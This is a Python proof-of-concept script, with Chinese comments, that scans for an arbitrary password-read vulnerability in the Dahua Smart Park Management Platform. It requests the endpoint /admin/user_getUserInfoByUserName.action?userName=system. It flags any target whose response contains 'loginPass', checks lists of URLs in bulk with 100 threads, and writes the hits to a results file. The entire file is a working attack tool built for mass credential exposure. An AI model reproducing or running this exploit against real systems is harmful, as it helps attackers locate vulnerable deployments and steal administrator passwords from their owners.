# 导包
import argparse,requests,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# 指纹模块
def banner():
    banner = '''

      _       _                     _     _ _           _ 
     | |     | |                   | |   (_) |         (_)
   __| | __ _| |__  _   _  __ _ ___| |__  _| |__  _   _ _ 
  / _` |/ _` | '_ \| | | |/ _` |_  / '_ \| | '_ \| | | | |
 | (_| | (_| | | | | |_| | (_| |/ /| | | | | | | | |_| | |
  \__,_|\__,_|_| |_|\__,_|\__,_/___|_| |_|_|_| |_|\__,_|_|
                                                                                                                 

                                            author:w
                                            version:0.0.1
'''
    print(banner)
# poc模块
def poc(target):
    url = target + "/admin/user_getUserInfoByUserName.action?userName=system"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if "loginPass" in res.text:
            print("[+] 这个url存在任意密码读取" + target)
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target + "存在任意密码读取\n")
        else:
            print("[-] 这个url不存在任意密码读取")
    except:
        pass

# 主函数模块
def main():
    banner()
    '''命令行接收参数'''
    parse = argparse.ArgumentParser(description="这是大华智慧园区管理平台任意密码读取的poc")
    #  -u 单个检测   -f 批量检测
    parse.add_argument('-u','--url',dest='url',type=str,help="url")
    parse.add_argument('-f','--file',dest='file',type=str,help='url.txt')
    # 调用
    args = parse.parse_args()
    # 处理命令行参数的事情
    # 判断是单个的url还是txt文件
    # 如果是单个url，直接利用poc
    if args.url and not args.file:
        poc(args.url)
    # 如果是文件，定义一个空列表，将txt文件中的url按行读取到url列表中
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        # 定义线程池为100
        mp = Pool(100)
        # 将列表参数输入到poc中利用
        mp.map(poc,url_list)
        # 关闭线程池
        mp.close()
        mp.join()
    else:
        print("Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == '__main__':
    main()